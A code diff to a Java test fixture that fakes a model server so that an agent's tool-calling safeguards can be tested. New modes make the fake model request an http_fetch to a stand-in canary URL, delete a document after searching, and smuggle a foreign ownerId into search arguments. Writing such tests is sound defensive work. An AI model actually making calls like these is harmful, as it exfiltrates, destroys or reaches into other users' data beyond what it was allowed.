@@ -9,7 +9,8 @@ import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
 
 final class AgentProtocolFixture implements AutoCloseable {
-    enum Mode { VALID, NAVIGATE, UNKNOWN, BAD_ARGS, DUPLICATE_ARGS, MULTI, LOOP, FORGED, REFUSED, NO_USAGE, ERROR, HOLD_FIRST, HOLD_FINAL }
+    enum Mode { VALID, NAVIGATE, UNKNOWN, BAD_ARGS, DUPLICATE_ARGS, MULTI, LOOP, FORGED, REFUSED, NO_USAGE, ERROR, HOLD_FIRST, HOLD_FINAL,
+        EXFILTRATE, AFTER_SEARCH_DELETE, AFTER_SEARCH_OWNER }
     final AtomicInteger requests = new AtomicInteger();
     volatile Mode mode = Mode.VALID;
     volatile JsonNode lastRequest;
@@ -38,15 +39,19 @@ final class AgentProtocolFixture implements AutoCloseable {
                     if ((behavior == Mode.HOLD_FIRST && results == 0) || (behavior == Mode.HOLD_FINAL && evidence != null)) {
                         entered.countDown(); try { release.await(5, TimeUnit.SECONDS); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); }
                     }
-                    boolean tool = behavior != Mode.REFUSED && (evidence == null || behavior == Mode.LOOP);
+                    boolean tool = behavior != Mode.REFUSED && (evidence == null || behavior == Mode.LOOP
+                            || behavior == Mode.AFTER_SEARCH_DELETE || behavior == Mode.AFTER_SEARCH_OWNER);
                     Map<String, Object> message;
                     if (tool) {
-                        String name = behavior == Mode.UNKNOWN ? "delete_document"
+                        String name = behavior == Mode.UNKNOWN || (behavior == Mode.AFTER_SEARCH_DELETE && evidence != null) ? "delete_document"
+                                : behavior == Mode.EXFILTRATE ? "http_fetch"
                                 : behavior == Mode.LOOP || (behavior == Mode.NAVIGATE && results == 0) ? AgentToolCatalog.LIST : AgentToolCatalog.SEARCH;
                         String args = name.equals(AgentToolCatalog.LIST) || name.equals("delete_document") ? "{}"
                                 : AgentToolCatalog.write(Map.of("query", "How long are deleted files kept in the recycle bin?"));
                         if (behavior == Mode.BAD_ARGS) args = "{\"query\":\"test\",\"ownerId\":8}";
                         if (behavior == Mode.DUPLICATE_ARGS) args = "{\"query\":\"first\",\"query\":\"second\"}";
+                        if (behavior == Mode.EXFILTRATE) args = "{\"url\":\"https://example.invalid/private-canary\"}";
+                        if (behavior == Mode.AFTER_SEARCH_OWNER && evidence != null) args = "{\"query\":\"test\",\"ownerId\":8}";
                         Map<String, Object> call = Map.of("id", "call_" + sequence, "type", "function", "function", Map.of("name", name, "arguments", args));
                         List<Map<String, Object>> calls = new ArrayList<>(List.of(call));
                         if (behavior == Mode.MULTI) calls.add(Map.of("id", "call_other", "type", "function", "function", Map.of("name", name, "arguments", args)));
